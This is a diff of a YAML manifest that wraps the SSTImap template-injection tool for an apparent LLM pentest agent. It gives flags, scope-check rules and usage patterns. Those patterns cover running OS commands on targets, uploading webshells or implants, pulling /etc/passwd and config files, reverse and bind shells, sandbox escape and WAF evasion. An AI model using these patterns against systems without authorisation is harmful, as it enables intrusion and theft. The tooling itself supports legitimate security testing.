@@ -1,18 +1,69 @@
 name: ssti
-version: "1.0"
-description: "Server-Side Template Injection detection and exploitation via SSTImap. 3 methods: detect (test URL/parameter for SSTI across 15+ template engines with 4 detection techniques — Rendered, Error-based, Boolean-blind, Time-blind), exploit (execute OS commands via confirmed SSTI), list_engines (show all supported engines by language). Supports Jinja2, Twig, Mako, Smarty, Freemarker, Velocity, Pug/Jade, Tornado, Django, ERB, Slim, Nunjucks, Pebble, EJS, Handlebars, and more. For file inclusion use lfi-rfi. For SQL injection use sqlmap."
+kind: cli
+binary: sstimap
+version: "1.3.3.7"
+description: "Server-Side Template Injection detection and exploitation via SSTImap (vladko312 fork — successor to tplmap). Detects 15+ template engines across Python (Jinja2, Mako, Tornado, Django, Cheetah3), PHP (Twig, Smarty, Latte), Java (Freemarker, Velocity, Pebble), JavaScript (Nunjucks, Pug/Jade, Dust, EJS, Handlebars, Marko, doT), and Ruby (ERB, Slim, Haml). Four detection techniques: R(endered), E(rror-based), B(oolean blind), T(ime-based blind). Native CLI; the LLM constructs the full sstimap invocation. SSTImap takes a complete URL via -u (NOT a hostname); the injection point can be marked by * in the URL or POST body, or auto-discovered across query/body/headers/cookies via -P. Some flags collide with sister tools (sqlmap uses -X for HTTP method; sstimap uses -m for method and -X for eval-code) — read this YAML carefully. Use for confirmed or suspected SSTI only — NOT for SQL injection (use sqlmap), NoSQL (use curl with operator-injection payloads + nuclei NoSQL templates), file inclusion (use lfi-rfi), or directory enumeration (use ffuf)."
 image: "ghcr.io/silicon-works/mcp-tools-ssti:latest"
-image_size_mb: 300
-timeout_seconds: 300
+image_size_mb: 320
+# Dual-clock model — sstimap detection completes in seconds-to-minutes for
+# simple endpoints, but boolean / time-based blind across high levels and
+# many engines can stretch into hours. Idle catches a wedged container.
+idle_timeout_seconds: 300       # 5 min silence between progress lines == wedged
+max_runtime_seconds: 7200       # 2 h hard cap — exploitation flows can take time
+timeout_seconds: 7200
 
 capabilities:
   - ssti_detection
   - ssti_exploitation
   - template_engine_identification
   - remote_code_execution
+  - sandbox_escape
 
 phases:
   - exploitation
+
+routing:
+  use_for:
+    - "detect Server-Side Template Injection in a URL parameter, POST body field, header, or cookie"
+    - "identify which template engine is vulnerable (Jinja2, Twig, Mako, Freemarker, Pug/Jade, etc.)"
+    - "exploit confirmed SSTI for OS command execution via -S/--os-cmd"
+    - "exploit confirmed SSTI for code evaluation via -X/--eval-code (template-language-level)"
+    - "upload a file to the target via SSTI (-U LOCAL REMOTE)"
+    - "download a file from the target via SSTI (-D REMOTE LOCAL)"
+    - "test parameters where user input is reflected in rendered pages"
+    - "bypass template sandbox restrictions with multiple escaping levels (-l 1..5)"
+    - "test SSTI behind authenticated sessions (via -C/--cookie or -H/--header)"
+    - "drive SSTI probing through a Burp / SOCKS proxy (-p http://proxy:port)"
+  never_use_for:
+    - "SQL injection — use sqlmap"
+    - "NoSQL injection — use curl with operator-injection payloads ($ne, $regex, $where) plus nuclei NoSQL templates"
+    - "Local/Remote File Inclusion — use lfi-rfi"
+    - "XSS detection — use nuclei or zap"
+    - "directory or parameter brute-forcing — use ffuf"
+    - "automated CVE / vulnerability scanning — use nuclei"
+    - "stateful authenticated session flows beyond a single Cookie/header — use web-session"
+  triggers:
+    - "ssti"
+    - "template injection"
+    - "server-side template injection"
+    - "sstimap"
+    - "tplmap"
+    - "Jinja2"
+    - "Twig"
+    - "Mako"
+    - "Freemarker"
+    - "Velocity"
+    - "Smarty"
+    - "Pug"
+    - "Jade"
+    - "Nunjucks"
+    - "Handlebars"
+    - "render_template"
+    - "template engine"
+    - "{{7*7}}"
+    - "${7*7}"
+    - "<%= 7*7 %>"
+  prefer_over: []
 
 requirements:
   network: true
@@ -22,154 +73,329 @@ resources:
   memory_mb: 256
   cpu: 0.5
 
-routing:
-  use_for:
-    - "detect Server-Side Template Injection in web application parameters"
-    - "identify which template engine is vulnerable (Jinja2, Twig, Mako, Freemarker, etc.)"
-    - "exploit SSTI for remote code execution (OS commands, reverse shell)"
-    - "test parameters where user input is reflected in rendered pages"
-    - "bypass template sandbox restrictions with multiple escaping levels"
-  never_use_for:
-    - "Local/Remote File Inclusion (use lfi-rfi)"
-    - "SQL injection (use sqlmap)"
-    - "XSS detection (use nuclei or zap)"
-    - "web directory fuzzing (use ffuf)"
-  triggers:
-    - SSTI
-    - template injection
-    - server-side template injection
-    - Jinja2
-    - Twig
-    - Mako
-    - Freemarker
-    - render_template
-    - template engine
-    - "{{7*7}}"
-  prefer_over: []
-
 see_also:
-  - tool: lfi-rfi
-    reason: SSTI is template injection (code execution in template engine). LFI/RFI is file inclusion (reading/including files). Different vulnerability classes — use lfi-rfi for path traversal and file reads.
   - tool: sqlmap
-    reason: Both test for injection but in different contexts. sqlmap tests SQL injection in database queries. ssti tests template injection in page rendering.
+    reason: "Both test for injection but in different contexts — sqlmap covers SQL, ssti covers template-engine code execution."
+  - tool: lfi-rfi
+    reason: "SSTI is template-engine code execution; LFI/RFI is file inclusion. Different vulnerability classes — agents sometimes confuse them."
+  - tool: nuclei
+    reason: "Nuclei has community templates that probe for SSTI on common endpoints (e.g., flask-jinja2, twig-debug); use nuclei first to find candidate URLs, then ssti for confirmation + exploitation."
   - tool: curl
-    reason: Use curl to manually send SSTI payloads (e.g., {{7*7}}) for quick checks. Use ssti (SSTImap) for automated detection across all engines with sandbox escape.
+    reason: "Use curl to manually fire SSTI canaries ({{7*7}}, ${7*7}, <%= 7*7 %>) for fast triage; switch to ssti for the full engine matrix + sandbox escape."
+  - tool: ffuf
+    reason: "Use ffuf to discover URL parameters first; feed them to ssti -u with the asterisk marker."
+  - tool: web-session
+    reason: "Capture an authenticated cookie before passing -C/--cookie to sstimap when the injection point is behind a login."
 
-methods:
-  detect:
-    description: "Test a URL/parameter for Server-Side Template Injection. Tries multiple template engine payloads and 4 detection techniques (Rendered, Error-based, Boolean-blind, Time-blind). Identifies the vulnerable engine and available capabilities (OS shell, code eval, template shell)."
-    when_to_use: "When user input is reflected in rendered web pages — potential template injection. Mark the injection point with * in the URL or POST data. SSTImap tests across 15+ engines automatically. Try increasing the level (1-5) if initial detection fails — higher levels attempt more complex escaping to bypass WAFs and filters."
-    params:
-      url:
-        type: string
-        required: true
-        description: "Target URL with * marking injection point (e.g., 'http://target/page?name=*'). If no * present, tests all parameters."
-      method:
-        type: string
-        default: "GET"
-        description: "HTTP method (GET or POST)."
-      data:
-        type: string
-        description: "POST data with * marking injection point (e.g., 'name=*&submit=1')."
-      headers:
-        type: object
-        description: "Custom HTTP headers as key-value pairs."
-      cookies:
-        type: string
-        description: "Cookie header value."
-      level:
-        type: integer
-        default: 1
-        description: "Escaping level 1-5. Higher tries more complex escaping to bypass filters."
-      engine:
-        type: string
-        description: "Test specific engines only (comma-separated, e.g., 'jinja2,twig'). Default: all."
-      technique:
-        type: string
-        default: "RE"
-        description: "Detection techniques: R(endered) E(rror-based) B(oolean-blind) T(ime-blind). Default: RE."
-      proxy:
-        type: string
-        description: "HTTP proxy (e.g., 'http://127.0.0.1:8080')."
-      timeout:
-        type: integer
-        default: 60
-        description: "Overall timeout in seconds."
-    returns:
-      vulnerable:
-        type: boolean
-        description: "Whether SSTI was confirmed."
-      engine:
-        type: string
-        description: "Identified template engine (e.g., 'Jinja2', 'Twig', 'Mako')."
-      os_shell_available:
-        type: boolean
-        description: "Whether OS command execution is possible."
-      eval_shell_available:
-        type: boolean
-        description: "Whether code evaluation is possible."
-      technique:
-        type: string
-        description: "Detection technique that worked (rendered, error-based, boolean-blind, time-blind)."
+# ── kind:cli specific sections ──────────────────────────────────────
 
-  exploit:
-    description: "Exploit a confirmed SSTI vulnerability to execute an OS command on the target. Returns the command output."
-    when_to_use: "After detect confirms SSTI — execute OS commands for RCE. Use 'id' or 'whoami' first to confirm execution context, then escalate to reverse shell or file reads."
-    params:
-      url:
-        type: string
-        required: true
-        description: "Target URL with * marking injection point."
-      command:
-        type: string
-        required: true
-        description: "OS command to execute (e.g., 'id', 'cat /etc/passwd', 'whoami')."
-      method:
-        type: string
-        default: "GET"
-        description: "HTTP method."
-      data:
-        type: string
-        description: "POST data with * marking injection point."
-      headers:
-        type: object
-        description: "Custom HTTP headers."
-      cookies:
-        type: string
-        description: "Cookie header value."
-      level:
-        type: integer
-        default: 1
-        description: "Escaping level 1-5."
-      engine:
-        type: string
-        description: "Force specific engine (skips detection). Use if detect already identified the engine."
-      proxy:
-        type: string
-        description: "HTTP proxy."
-      timeout:
-        type: integer
-        default: 60
-        description: "Overall timeout in seconds."
-    returns:
-      output:
-        type: string
-        description: "Command execution output."
-      engine:
-        type: string
-        description: "Template engine used."
-      vulnerable:
-        type: boolean
-        description: "Whether exploitation succeeded."
+target_extraction:
+  # SSTImap target is supplied via -u / --url (the most common form). Bulk
+  # ingestion via --load-urls / --load-forms is rejected up front (see
+  # reject_flags) — those put the target outside the command line where
+  # scope validation cannot reach it. We extract the URL host from the
+  # simple -u / --url cases.
+  - rule: "flag_value"
+    flag: "-u"
+    parse_as: "url_host"
+  - rule: "flag_value"
+    flag: "--url"
+    parse_as: "url_host"
+  # Safety net for `-u=URL` and `--url=URL` equals-form (uncommon but valid).
+  - rule: "positional_match"
+    pattern: "^(?:--url=|-u=)?(https?|ftp|ftps|file|gopher)://([^:/?#*]+)"
+    group: 2
+    parse_as: "url_host"
 
-  list_engines:
-    description: "List all template engines supported by SSTImap, grouped by programming language."
-    when_to_use: "Reference — check which engines SSTImap can detect and exploit. Useful when you know the target's tech stack and want to confirm coverage."
-    params: {}
-    returns:
-      engines_by_language:
-        type: object
-        description: "Engines grouped by language (Python, PHP, Java, JavaScript, Ruby, Go, Rust)."
-      total:
-        type: integer
-        description: "Total number of supported engines."
+# Flags whose presence makes target scope un-validatable. The plugin's
+# cli_in_container rejects the call before docker spawn when any of these
+# appear, with the reason below. The LLM can extract the target from the
+# file first and pass it via -u for the actual scan.
+reject_flags:
+  - "--load-urls"   # bulk URL list (file or stdin)
+  - "--load-forms"  # bulk form descriptor list
+  - "-i"            # interactive REPL — stdin-blocked in containers
+  - "--interactive" # same as -i
+  - "-s"            # interactive OS shell
+  - "--os-shell"    # same as -s — interactive prompt
+  - "-t"            # interactive template-engine REPL (BUT NOTE: -t is sstimap's tpl-shell, NOT --type as some readers assume)
+  - "--tpl-shell"   # same as -t
+  - "-x"            # interactive language-level eval REPL
+  - "--eval-shell"  # same as -x
+reject_flags_reason: "Bulk-target loaders (--load-urls / --load-forms) put the target outside the command line. Interactive shells (-i / -s / -t / -x and their long forms) block on stdin in a container with no TTY. Switch to a single -u / --url target and use -S/--os-cmd or -X/--eval-code for non-interactive command/code execution."
+
+# Per-tool value-taking flags whose values must NOT be confused with
+# positional targets. The DSL merges these with built-in defaults. Any flag
+# whose value could leak as a URL or hostname must appear here.
+value_flags:
+  - "-u"               # URL — already covered by target_extraction
+  - "--url"
+  - "-d"               # POST body data param (stackable)
+  - "--data"
+  - "--data-type"
+  - "--data-params"
+  - "-H"               # extra HTTP header (stackable)
+  - "--header"
+  - "-C"               # extra cookie (stackable) — NOT -c (which is --crawl!)
+  - "--cookie"
+  - "-m"               # HTTP method (NOT --method — sstimap is short -m only)
+  - "--method"
+  - "-M"               # injection marker string (default '*')
+  - "--marker"
+  - "-P"               # injection points (Q B H C)
+  - "--injection-points"
+  - "-a"               # User-Agent string
+  - "--user-agent"
+  - "-p"               # proxy URL — http://proxy:port (NOT --proxy alone, sstimap uses -p)
+  - "--proxy"
+  - "-e"               # template engines list (e.g., 'jinja,twig')
+  - "--engine"
+  - "-l"               # escaping level 1-5
+  - "--level"
+  - "-L"               # force-level LEVEL CLEVEL (two args)
+  - "--force-level"
+  - "-r"               # techniques REBT
+  - "--technique"
+  - "-c"               # CRAWL DEPTH (this is sstimap's crawl flag, NOT cookie!)
+  - "--crawl"
+  - "--crawl-exclude"
+  - "--crawl-domains"
+  - "--save-urls"
+  - "--save-forms"
+  - "--bool-ok"
+  - "--bool-err"
+  - "--bool-match"
+  - "--bool-match-min"
+  - "--bool-fuzzy"
+  - "--bool-samples"
+  - "--blind-delay"
+  - "--verify-blind-delay"
+  - "--delay"
+  - "-T"               # template-engine code (single arg)
+  - "--tpl-code"
+  - "-X"               # eval LANGUAGE code (single arg) — NOT method!
+  - "--eval-code"
+  - "-S"               # os-cmd single command
+  - "--os-cmd"
+  - "-B"               # bind-shell PORT (one int arg)
+  - "--bind-shell"
+  - "-R"               # reverse-shell HOST PORT (two args)
+  - "--reverse-shell"
+  - "--remote-shell"   # remote shell path (e.g., /bin/sh)
+  - "-U"               # upload LOCAL REMOTE (TWO positional args)
+  - "--upload"
+  - "-D"               # download REMOTE LOCAL (TWO positional args)
+  - "--download"
+  - "--module"         # module info ('list' or module name)
+  - "--config"         # config file or directory
+
+usage_patterns:
+  - name: "Detection only — single URL, all engines, default level"
+    command: "sstimap -u {url_with_asterisk} --no-color"
+    when: "First-pass SSTI probe on a URL with a parameter (e.g., http://target/page?name=test). Mark the injection point with * (sstimap's default marker) or omit it and let -P discover. Detection-only by default — no exploitation flags. Add --no-color to keep stdout parseable."
+
+  - name: "Detection only — POST body field"
+    command: "sstimap -u {url} -m POST -d {post_body_with_asterisk} --no-color"
+    when: "Login form / API endpoint that accepts POST data. Mark the injection point with * inside -d (e.g., 'username=admin&password=*'). -m POST is required (sstimap defaults to GET)."
+
+  - name: "Detection only — specific engine (skip the matrix)"
+    command: "sstimap -u {url_with_asterisk} -e {engine} --no-color"
+    when: "Tech-stack recon already identified the framework — skip sstimap's full engine sweep by naming the engine (e.g., 'jinja', 'twig', 'mako', 'freemarker'). Much faster on time-based blind."
+
+  - name: "Detection — boost escaping level for sandboxed engines"
+    command: "sstimap -u {url_with_asterisk} -l {level} --no-color"
+    when: "Default level=1 missed the bug; raise -l (max 5) to attempt more complex escaping, sandbox-bypass payloads, and longer chains. Each level multiplies request count — start with 2, escalate to 5 only if needed."
+
+  - name: "Code execution — run a single OS command"
+    command: "sstimap -u {url_with_asterisk} -e {engine} -S {command} --no-color"
+    when: "After detection confirms SSTI — execute an OS command on the target (e.g., 'id', 'whoami', 'cat /etc/passwd'). Use -e to pin the engine sstimap already identified — skips re-detection. -S is the NON-INTERACTIVE form; -s/--os-shell would block on stdin."
+
+  - name: "Code execution — language-level eval"
+    command: "sstimap -u {url_with_asterisk} -e {engine} -X {language_code} --no-color"
+    when: "Some engines run sandboxed and refuse os-cmd but allow language-level eval. -X executes code in the engine's host language (Python for Jinja2, PHP for Twig, etc.). Use to break out of the sandbox via builtins / __subclasses__ / globals chains."
+
+  - name: "File upload via SSTI"
+    command: "sstimap -u {url_with_asterisk} -e {engine} -U {local_path} {remote_path} --no-color"
+    when: "Once RCE is confirmed, drop a webshell or implant. -U takes TWO arguments (LOCAL REMOTE) — NOT colon-separated. Pin {local_path} under /session/ inside the container; {remote_path} is on the target."
+
+  - name: "File download via SSTI"
+    command: "sstimap -u {url_with_asterisk} -e {engine} -D {remote_path} {local_path} --no-color"
+    when: "Pull a file from the target via SSTI — config files, /etc/passwd, source. -D takes TWO arguments (REMOTE LOCAL). Pin {local_path} under /session/."
+
+  - name: "Probe behind an authenticated session (cookie)"
+    command: "sstimap -u {url_with_asterisk} -C {cookie_string} --no-color"
+    when: "Endpoint requires login — paste the Cookie header value via -C/--cookie (note: short flag is -C uppercase, NOT -c which is --crawl). Pair with web-session for token capture."
+
+  - name: "Probe through Burp / a proxy"
+    command: "sstimap -u {url_with_asterisk} -p http://127.0.0.1:8080 --no-color"
+    when: "Route every request through Burp/ZAP for live inspection. Note: sstimap's proxy flag is -p (lowercase), NOT --proxy (sqlmap convention is different)."
+
+  - name: "Force a specific HTTP method"
+    command: "sstimap -u {url} -m {METHOD} -d {body_with_asterisk} --no-color"
+    when: "Endpoint accepts non-GET/POST (PUT, PATCH, DELETE). sstimap's method flag is -m (lowercase short), NOT -X (which is --eval-code in sstimap; this collides with curl/sqlmap conventions)."
+
+  - name: "Pin marker (when default '*' collides with target content)"
+    command: "sstimap -u {url} -M {custom_marker} -d {body_with_custom_marker} --no-color"
+    when: "Default marker '*' may appear naturally in the target's responses, causing false positives or detection mismatch. Pick a unique sentinel (e.g., 'OPENSPLOIT_CANARY_2026') and use both in the URL/body and via -M."
+
+  - name: "Restrict injection points (skip body/headers/cookies)"
+    command: "sstimap -u {url_with_asterisk} -P Q --no-color"
+    when: "Default -P is QBHC (Query, Body, Headers, Cookies). Restrict to one layer to cut request count when you already know where the bug is. 'Q' = query only, 'B' = body, 'H' = headers, 'C' = cookies. Combine letters: 'QB' for query+body."
+
+  - name: "Time-based blind only (when other techniques fail)"
+    command: "sstimap -u {url_with_asterisk} -r T --blind-delay 5 --no-color"
+    when: "Rendered/error/boolean techniques all returned negative — try time-based blind. Raise --blind-delay on slow networks (default 4s); --verify-blind-delay applies during exploitation phase."
+
+  - name: "Custom random User-Agent"
+    command: "sstimap -u {url_with_asterisk} -A --no-color"
+    when: "Default UA is 'SSTImap/<version>' — gets blocked by every WAF. -A picks a random desktop browser UA per request. -a 'Mozilla/5.0 ...' for a fixed UA."
+
+  - name: "Crawler-driven discovery (slow, broad)"
+    command: "sstimap -u {entry_url} -c 2 -f --no-color"
+    when: "When the injection point is unknown — sstimap crawls the site (depth -c) and tests every form (-f). Combine with --crawl-domains S to stay within subdomains. Slow; prefer ffuf to find params first."
+
+  - name: "Detection-only smoke / version check"
+    command: "sstimap -V"
+    when: "Version banner — fast smoke test that the kind:cli path is wired and the binary resolves on PATH. Note: -V (uppercase), NOT -v."
+
+output_formats:
+  # SSTImap has NO native JSON / XML output flag. Output is verbose ANSI-coloured
+  # prose to stdout. Pass --no-color in every kind:cli invocation so tool_runner
+  # parses cleanly. There is no per-target session file or output-dir option;
+  # the LLM must capture stdout via the run_cli result envelope. SSTImap also
+  # writes ~/.sstimap/sstimap.log inside the container if --log-response is set,
+  # but that is not exposed back to the host.
+  - flag: "--no-color"
+    format: "plain_text"
+    preferred: true
+  - flag: "--log-response"
+    format: "container_log"
+    preferred: false
+
+common_options:
+  targeting:
+    - "-u URL / --url URL: single target URL (e.g., 'http://t/?name=test') — REQUIRED for non-interactive runs"
+    - "Mark injection point in URL/body with * (default marker) — sstimap will only test the marked spot"
+    - "-P QBHC / --injection-points QBHC: which layers to test if no marker (Q query, B body, H headers, C cookies)"
+    - "-M MARKER / --marker MARKER: override the default '*' marker"
+  request:
+    - "-d 'param=value' / --data ...: POST body data (stackable — pass -d multiple times for multiple params)"
+    - "-H 'Header: value' / --header ...: extra HTTP header (stackable)"
+    - "-C 'name=value' / --cookie ...: extra cookie (stackable). NOTE: -C is uppercase; -c is --crawl"
+    - "-m METHOD / --method METHOD: HTTP method (default GET). NOTE: short flag -m, NOT -X"
+    - "-a UA / --user-agent UA: fixed User-Agent"
+    - "-A / --random-user-agent: rotate User-Agent per request"
+    - "-p URL / --proxy URL: HTTP proxy. NOTE: short flag -p, NOT --proxy alone for sqlmap-style"
+    - "--verify-ssl: verify TLS (off by default)"
+    - "--delay N: seconds between requests"
+  detection:
+    - "-l 1..5 / --level 1..5: escaping depth — higher tries more complex sandbox-bypass payloads"
+    - "-L LEVEL CLEVEL / --force-level LEVEL CLEVEL: pin both the level and 'context level' (advanced)"
+    - "-e ENGINES / --engine ENGINES: comma-separated list (e.g., 'jinja,twig'). Use '*' for all (default)"
+    - "-r REBT / --technique REBT: enable subset of techniques. Default REBT (all four)"
+    - "--blind-delay N: seconds for time-based blind detection (default 4)"
+    - "--legacy: include older payloads that no longer work on current engine versions"
+    - "--generic: try generic-engine payloads in addition to dedicated ones"
+  exploitation:
+    - "-S CMD / --os-cmd CMD: NON-INTERACTIVE OS command (use this, NOT -s/--os-shell)"
+    - "-X CODE / --eval-code CODE: eval code in the engine's host language (Python/PHP/Java/etc.)"
+    - "-T CODE / --tpl-code CODE: inject code in the template engine itself"
+    - "-U LOCAL REMOTE / --upload LOCAL REMOTE: upload file (TWO args, no colon)"
+    - "-D REMOTE LOCAL / --download REMOTE LOCAL: download file"
+    - "-R HOST PORT / --reverse-shell HOST PORT: spawn reverse shell to your listener (two args)"
+    - "-B PORT / --bind-shell PORT: bind shell on PORT of the target (one int arg)"
+    - "--remote-shell PATH: target shell path (default /bin/sh)"
+    - "-F / --force-overwrite: overwrite when uploading"
+  crawler:
+    - "-c N / --crawl N: depth to crawl (default 0 = no crawl). NOTE: -c is depth, NOT cookie!"
+    - "-f / --forms: scan crawled pages for forms"
+    - "--empty-forms: treat param-less pages as GET forms"
+    - "--crawl-exclude REGEX: skip URLs matching"
+    - "--crawl-domains Y/S/N: cross-domain crawl behaviour (default S = subdomains only)"
+    - "--save-urls FILE/DIR: save crawled URLs"
+    - "--save-forms FILE/DIR: save crawled forms"
+  noise_control:
+    - "--no-color: REQUIRED for kind:cli — strips ANSI escapes from stdout"
+    - "--log-response: append HTTP responses to ~/.sstimap/sstimap.log inside container"
+    - "--module list: list available payload modules"
+    - "--module NAME: print info about a specific module"
+    - "--config PATH: alternative config file or directory"
+
+gotchas:
+  - "ALWAYS pass --no-color — sstimap colours stdout with ANSI escape codes by default; tool_runner's prose parsing is more reliable without them"
+  - "ALWAYS use the NON-INTERACTIVE exploitation flags (-S/--os-cmd, -X/--eval-code, -T/--tpl-code, -U/--upload, -D/--download). The interactive shells (-s/--os-shell, -x/--eval-shell, -t/--tpl-shell, -i/--interactive) block on stdin — there's no TTY in the container — and will hang until idle_timeout fires"
+  - "SHORT-FLAG COLLISIONS — sstimap diverges from sqlmap/curl conventions. Read carefully: -X is --eval-code (NOT --method); -m is --method (NOT --header-value); -C is --cookie (NOT --certificate); -c is --crawl-depth (NOT --cookie); -p is --proxy (NOT --port); -V is --version (NOT --verbose); -a is --user-agent (NOT --auth)"
+  - "-u takes a FULL URL with scheme (http://...), NOT a hostname. Pass the parameter you want to test as part of the URL query string and mark the injection point with * (default marker)"
+  - "-d (POST data) is STACKABLE — pass multiple `-d 'k=v'` to add multiple body params. NOT comma-separated"
+  - "-H (header) and -C (cookie) are also stackable. Same rule as -d"
+  - "-l (level) is LOWERCASE; -L (force-level) takes TWO integer arguments and is for advanced tuning. Most uses want -l only"
+  - "-r (technique) takes one or more letters from REBT (Rendered, Error-based, Boolean-blind, Time-blind). Default is REBT (all four)"
+  - "-e (engine) takes a comma-separated list (e.g., 'jinja,twig,mako'). Use '*' for all engines (which is also the default if -e is omitted)"
+  - "Default marker is '*'. If '*' collides with target content (rare but real), pin a unique sentinel via -M and use the same sentinel inside -u / -d"
+  - "-U/--upload and -D/--download take TWO POSITIONAL arguments (e.g., `-U /session/shell.php /var/www/html/x.php`), NOT a colon-separated 'LOCAL:REMOTE' string. Different from sqlmap/metasploit conventions"
+  - "No native --output / --output-dir flag — sstimap prints to stdout. Capture results from the run_cli envelope; there is no per-run session file"
+  - "No --timeout flag — sstimap uses --delay (between requests) and --blind-delay (for time-based detection). Hard cap is the kind:cli max_runtime_seconds"
+  - "No --retries flag — failed requests are retried internally with sstimap's own backoff; you cannot tune from the CLI"
+  - "vladko312/SSTImap is moderately maintained (1.3.x line); latest engine variants and exotic frameworks may need manual payloads. nuclei has SSTI templates that can supplement; tplmap (predecessor) is largely abandoned"
+  - "When the agent suspects SSTI but sstimap returns 'no SSTI detected', try (a) raise -l, (b) restrict -P to suspected layer, (c) pin -e to the framework's engine, (d) custom -M marker if '*' is filtered, (e) use curl manually with {{7*7}} / ${7*7} / <%= 7*7 %> canaries to confirm the surface is alive"
+  - "/etc/passwd via -D requires the engine's filesystem primitive (e.g., open() in Jinja2/Mako, file_get_contents() in Twig). If unavailable, fall back to -S with a shell built-in like `cat /etc/passwd`"
+  - "Legacy mcp-server.py defaulted -r RE (Rendered + Error-based only) for the detect method to keep first-pass scans fast. Default sstimap (-r unset) tries all four REBT — fine for thorough probes but ~4× slower on time-blind. For triage runs, pass `-r RE` explicitly; reserve full REBT for confirmed-but-not-yet-found surfaces"
+  - "Legacy mcp-server.py accepted a `cookies` string and emitted it as `-H 'Cookie: <value>'`. sstimap also accepts `-C 'name=value'` (stackable, one-pair-per-flag). Both work; prefer `-C` for explicit per-cookie semantics, fall back to `-H 'Cookie: …'` only when pasting a captured browser Cookie header verbatim"
+
+failure_signatures:
+  # IMPORTANT: sstimap exit code semantics vary — successful detection (engine
+  # found) returns 0; unsuccessful detection (no SSTI) ALSO returns 0 in most
+  # builds; fatal connection / DNS errors may return 0 with [CRITICAL] in
+  # stdout, or non-zero. tool_runner pattern-matches signals regardless of
+  # exit code. All signal strings below are the actual prose sstimap prints
+  # (verified against vladko312/SSTImap 1.3.3.7 source).
+  #
+  # Layer diversity (SKILL #11) — at least 5 distinct verifiable layers:
+  #   1. DNS  2. TCP  3. HTTP/TLS  4. SSTI-detection  5. Argument parsing
+  #   6. Filesystem (upload/download)  7. Engine-specific
+  - signal: "could not resolve"
+    remediation: "DNS lookup failed for the -u host. Verify the hostname spelling, /etc/hosts inside the container, or pass an IP. SSTImap surfaces the underlying requests/urllib3 error verbatim."
+  - signal: "Name or service not known"
+    remediation: "Same as 'could not resolve' — DNS failure. Use IP if DNS is unreliable in the test environment."
+  - signal: "Failed to establish a new connection"
+    remediation: "TCP connection failed (refused/closed/filtered/route problem). Confirm the port with curl or nmap before re-running. Check VPN / firewall."
+  - signal: "Connection refused"
+    remediation: "The web port is closed or filtered — confirm the service is up with 'nmap -p 80,443 <host>' or 'curl -I http://host'."
+  - signal: "Connection reset by peer"
+    remediation: "Server closed the TCP connection mid-request — could be IDS reset, WAF block, or transient network issue. Retry with --delay 1 to slow probes; consider -p (proxy) for inspection."
+  - signal: "Read timed out"
+    remediation: "HTTP response timeout — target slow. Raise --delay; reduce concurrent probing by pinning -e and -P. SSTImap has no per-request --timeout flag."
+  - signal: "SSL: CERTIFICATE_VERIFY_FAILED"
+    remediation: "TLS cert validation failed — by default sstimap does NOT verify, so this only fires if --verify-ssl is on. Drop --verify-ssl or fix the cert chain."
+  - signal: "No SSTI detected"
+    remediation: "sstimap exhausted all enabled techniques and engines without finding SSTI. Try (a) raise -l (level 1 → 3 → 5), (b) restrict -P to the suspected layer, (c) pin -e to a specific engine if framework is known, (d) custom -M marker if '*' is filtered, (e) verify manually with curl + canary payload {{7*7}} / ${7*7} / <%= 7*7 %>."
+  - signal: "no template injection found"
+    remediation: "Same outcome as 'No SSTI detected' — sstimap found no vulnerable engine. Same diagnostic checklist."
+  - signal: "URL is required"
+    remediation: "Missing -u / --url. SSTImap needs a single target URL for non-interactive mode."
+  - signal: "the following arguments are required"
+    remediation: "argparse complained about a missing required arg — most often -u. Re-emit with the full required flag set."
+  - signal: "unrecognized arguments"
+    remediation: "Argparse rejected an unknown flag — check spelling against `sstimap --help`. Common errors: typing --type instead of -e/--engine; --headers (plural) instead of -H/--header (singular); --cookies instead of -C/--cookie."
+  - signal: "Could not read file"
+    remediation: "Local file in -U upload doesn't exist or isn't readable inside the container. Pin under /session/ and verify with `ls /session/`."
+  - signal: "upload failed"
+    remediation: "Server-side write failed via the engine's filesystem primitive — common when the remote path isn't writable, the engine's sandbox blocks file ops, or directory traversal is filtered. Try a different remote path or fall back to -S with `tee >` shell idiom."
+  - signal: "Engine .* not detected"
+    remediation: "The forced engine via -e didn't match; sstimap couldn't trigger its payloads. Drop -e (auto-detect across all) or pick a different engine (e.g., switch jinja2 → mako on Python, twig → smarty on PHP)."
+  - signal: "Permission denied"
+    remediation: "Filesystem operation rejected by the engine's sandbox or OS-level permissions. Try a writable directory (/tmp, /var/tmp) or escalate via -X to break out of the sandbox first."
+  - signal: "Traceback (most recent call last)"
+    remediation: "Python exception leaked through — likely a build / dependency mismatch or an unhandled engine response. Capture full stderr; consider rebuilding the image (mcp-common 0.3.0 + fresh SSTImap clone)."
+
+help_commands:
+  - command: "sstimap --help"
+    purpose: "Concise flag listing"
+  - command: "sstimap -h"
+    purpose: "Same as --help"
+  - command: "sstimap -V"
+    purpose: "Version banner — verifies the kind:cli wrapper resolves /opt/sstimap/sstimap.py. NOTE: uppercase -V, NOT -v"
+  - command: "sstimap --version"
+    purpose: "Same as -V"
+  - command: "sstimap --module list"
+    purpose: "List all available SSTImap payload modules (one per engine)"
